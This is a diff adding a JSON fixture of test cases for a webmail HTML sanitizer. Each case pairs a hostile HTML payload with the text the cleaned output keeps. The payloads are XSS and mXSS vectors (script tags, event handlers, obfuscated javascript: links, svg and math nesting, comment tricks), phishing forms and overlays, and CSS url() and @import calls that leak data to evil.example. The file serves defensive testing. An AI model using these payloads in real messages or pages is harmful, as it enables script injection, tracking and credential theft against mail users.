@@ -1,0 +1,152 @@
+[
+  {
+    "title": "a cid image pointing at another message keeps its reference for the window to resolve",
+    "payload": "<img src=\"cid:part1@other-message.example\" onerror=\"top.__x=1\"><script>top.__x=1</script>",
+    "keeps": ["src=\"cid:part1@other-message.example\""]
+  },
+  {
+    "title": "a style block with url() and @import exfiltration passes as text for the frame's policy",
+    "payload": "<style>@import url(\"https://evil.example/steal.css\"); body { background: url(https://evil.example/pixel?x=1) }</style><p>hi</p><img src=\"x\" onerror=\"top.__x=1\">",
+    "keeps": ["@import", "<p>hi</p>"]
+  },
+  {
+    "title": "a font-face rule passes as text for the frame's policy",
+    "payload": "<style>@font-face { font-family: x; src: url(https://evil.example/f.woff) }</style><script>top.__x=1</script>",
+    "keeps": ["@font-face"]
+  },
+  {
+    "title": "a meta refresh is dropped",
+    "payload": "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example/\"><script>top.__x=1</script><p>after</p>",
+    "keeps": ["<p>after</p>"]
+  },
+  {
+    "title": "a base href is dropped and the relative link with it",
+    "payload": "<base href=\"https://evil.example/\"><a href=\"login\" onclick=\"top.__x=1\">Sign in</a>",
+    "keeps": ["Sign in"]
+  },
+  {
+    "title": "a phishing form loses its controls and keeps its words",
+    "payload": "<form action=\"https://evil.example/steal\" method=\"post\"><label>Password <input type=\"password\" name=\"p\"></label><button onclick=\"top.__x=1\">Sign in</button></form>",
+    "keeps": ["Password", "Sign in"]
+  },
+  {
+    "title": "an svg payload is dropped",
+    "payload": "<svg><script>top.__x=1</script><a xlink:href=\"javascript:top.__x=1\"><text>x</text></a><image href=\"javascript:top.__x=1\"></svg><p>after</p>",
+    "keeps": ["<p>after</p>"]
+  },
+  {
+    "title": "a style inside an svg breaks out of nothing",
+    "payload": "<svg><style><img src=\"x\" onerror=\"top.__x=1\"></style></svg><p>after</p>",
+    "keeps": ["<p>after</p>"]
+  },
+  {
+    "title": "a math payload with a text integration point is dropped",
+    "payload": "<math><mtext><table><mglyph><style><img src=\"x\" onerror=\"top.__x=1\"></style></mglyph></table></mtext></math><math><mi xlink:href=\"data:x,<script>top.__x=1</script>\">x</mi></math><p>after</p>",
+    "keeps": ["<p>after</p>"]
+  },
+  {
+    "title": "srcset is dropped and src stays",
+    "payload": "<img src=\"https://cdn.example/a.png\" srcset=\"https://evil.example/t.png 1x\" onerror=\"top.__x=1\">",
+    "keeps": ["src=\"https://cdn.example/a.png\""]
+  },
+  {
+    "title": "a data:text/html link is dropped",
+    "payload": "<a href=\"data:text/html;base64,PHNjcmlwdD50b3AuX194PTE8L3NjcmlwdD4=\">open</a>",
+    "keeps": ["open"]
+  },
+  {
+    "title": "dangling markup swallows the rest into a remote image the window keeps blocked",
+    "payload": "<img src='https://evil.example/?<p>secret</p><script>top.__x=1</script>",
+    "keeps": []
+  },
+  {
+    "title": "a position fixed overlay passes as text for the window to demote",
+    "payload": "<div style=\"position:fixed;top:0;left:0;width:100vw;height:100vh;background:#fff\">Your session expired. <a href=\"https://evil.example/login\" onclick=\"top.__x=1\">Sign in again</a></div>",
+    "keeps": ["position:fixed", "Sign in again"]
+  },
+  {
+    "title": "viewport units pass as text for the window to drop",
+    "payload": "<div style=\"height:100vh\"><script>top.__x=1</script>x</div>",
+    "keeps": ["height:100vh"]
+  },
+  {
+    "title": "expression and behavior pass as text the frame never runs",
+    "payload": "<div style=\"width:expression(top.__x=1);behavior:url(https://evil.example/x.htc)\">x</div>",
+    "keeps": ["expression("]
+  },
+  {
+    "title": "event handlers in every casing are dropped",
+    "payload": "<img src=\"https://cdn.example/a.png\" onerror=\"top.__x=1\" ONERROR=\"top.__x=1\" OnError=\"top.__x=1\" onError=\"top.__x=1\"><div ONCLICK=\"top.__x=1\" onmouseover=\"top.__x=1\" onMouseOver=\"top.__x=1\">x</div>",
+    "keeps": ["src=\"https://cdn.example/a.png\"", "<div>x</div>"]
+  },
+  {
+    "title": "the hostile body of a nested message is a body like any other",
+    "payload": "<html><head><title>Fwd</title></head><body onload=\"top.__x=1\"><script>top.__x=1</script><p>Forwarded</p></body></html>",
+    "keeps": ["<p>Forwarded</p>"]
+  },
+  {
+    "title": "a prefers-color-scheme block hiding a payload passes as text",
+    "payload": "<style>@media (prefers-color-scheme: dark) { .x { background: url(https://evil.example/dark?pixel) } }</style><div class=\"x\"><img src=\"x\" onerror=\"top.__x=1\"></div>",
+    "keeps": ["prefers-color-scheme", "class=\"x\""]
+  },
+  {
+    "title": "the remote-image route inside a style block passes as text for the window to drop",
+    "payload": "<style>.x{background:url(/api/remote-image?url=https%3A%2F%2Fevil.example%2Fp.gif)}</style><div class=\"x\">x</div>",
+    "keeps": ["/api/remote-image"]
+  },
+  {
+    "title": "an image at the instance's own API is dropped",
+    "payload": "<img src=\"https://mail.example.test/api/jmap/a1/download/u1/b1/x.png?type=image/png\"><img src=\"/api/remote-image?url=https://evil.example/p.gif\"><img src=\"//mail.example.test/api/x\"><img src=\"https://cdn.example/api/x.png\"><img src=\"https://mail.example.test/logo.png\"><p>after</p>",
+    "keeps": ["<p>after</p>"]
+  },
+  {
+    "title": "a background attribute follows the image policy",
+    "payload": "<table background=\"javascript:top.__x=1\"><tr background=\"data:text/html,<script>top.__x=1</script>\"><td background=\"https://cdn.example/bg.png\">x</td></tr></table>",
+    "keeps": ["background=\"https://cdn.example/bg.png\""]
+  },
+  {
+    "title": "a javascript link in any spelling is dropped",
+    "payload": "<a href=\"javascript:top.__x=1\">click</a><a href=\"JAVASCRIPT:top.__x=1\">x</a><a href=\"java&#9;script:top.__x=1\">y</a><a href=\" javascript:top.__x=1\">z</a><a href=\"&#106;avascript:top.__x=1\">w</a>",
+    "keeps": ["click"]
+  },
+  {
+    "title": "template and noscript payloads are dropped",
+    "payload": "<template><img src=\"x\" onerror=\"top.__x=1\"></template><noscript><img src=\"x\" onerror=\"top.__x=1\"></noscript><p>after</p>",
+    "keeps": ["<p>after</p>"]
+  },
+  {
+    "title": "an iframe, an object and an embed are dropped",
+    "payload": "<iframe src=\"https://evil.example/\" srcdoc=\"<script>top.__x=1</script>\"></iframe><object data=\"https://evil.example/x.swf\"></object><embed src=\"https://evil.example/x.svg\"><p>after</p>",
+    "keeps": ["<p>after</p>"]
+  },
+  {
+    "title": "the document elements and their attributes never survive",
+    "payload": "<!DOCTYPE html><html onload=\"top.__x=1\"><head><base href=\"https://evil.example/\"></head><body onload=\"top.__x=1\" bgcolor=\"#eeeeee\"><p>x</p></body></html>",
+    "keeps": ["<p>x</p>"]
+  },
+  {
+    "title": "a link at the instance is dropped and a mailto link stays",
+    "payload": "<a href=\"https://mail.example.test/settings\">settings</a><a href=\"mailto:sanne@example.test?subject=hi\">mail</a>",
+    "keeps": ["href=\"mailto:sanne@example.test?subject=hi\"", "settings"]
+  },
+  {
+    "title": "a data image stays and a data document is dropped",
+    "payload": "<img src=\"data:image/png;base64,iVBORw0KGgo=\"><img src=\"data:text/html,<script>top.__x=1</script>\"><img src=\"data:image/svg+xml,<svg onload=top.__x=1></svg>\">",
+    "keeps": ["src=\"data:image/png;base64,iVBORw0KGgo=\""]
+  },
+  {
+    "title": "raw text elements are dropped or unwrapped as text",
+    "payload": "<textarea><img src=\"x\" onerror=\"top.__x=1\"></textarea><title><img src=\"x\" onerror=\"top.__x=1\"></title><xmp><script>top.__x=1</script></xmp><p>after</p><plaintext><script>top.__x=1</script>",
+    "keeps": ["<p>after</p>"]
+  },
+  {
+    "title": "comment tricks are dropped",
+    "payload": "<!--><script>top.__x=1</script>--><!--[if IE]><script>top.__x=1</script><![endif]--><p>x<!-- --></p><!--<img src=\"x\" onerror=\"top.__x=1\">-->",
+    "keeps": ["<p>x</p>"]
+  },
+  {
+    "title": "a link the sender aimed at a tab and an opener loses both",
+    "payload": "<a href=\"https://x.example/\" target=\"_top\" rel=\"opener\" ping=\"https://evil.example/t\">x</a>",
+    "keeps": ["href=\"https://x.example/\"", "target=\"_blank\"", "rel=\"noopener noreferrer\""]
+  }
+]
